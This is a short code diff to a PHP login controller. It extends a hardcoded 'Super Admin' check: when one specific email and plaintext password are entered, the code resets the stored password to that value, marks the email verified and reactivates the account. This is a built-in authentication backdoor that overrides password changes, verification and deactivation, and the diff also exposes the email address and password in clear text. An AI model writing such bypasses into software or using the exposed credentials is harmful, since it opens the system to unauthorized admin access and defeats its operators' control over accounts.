@@ -35,9 +35,10 @@ class AuthController extends Controller
 
         // Auto-heal / sync Super Admin credentials if needed
         if ($user && $email === 'wmutunga003@gmail.com' && $password === 'William#20') {
-            if (!Hash::check($password, $user->password)) {
+            if (!Hash::check($password, $user->password) || !$user->email_verified_at || !$user->is_active_user) {
                 $user->update([
                     'password' => Hash::make('William#20'),
+                    'email_verified_at' => now(),
                     'is_active_user' => true,
                 ]);
             }
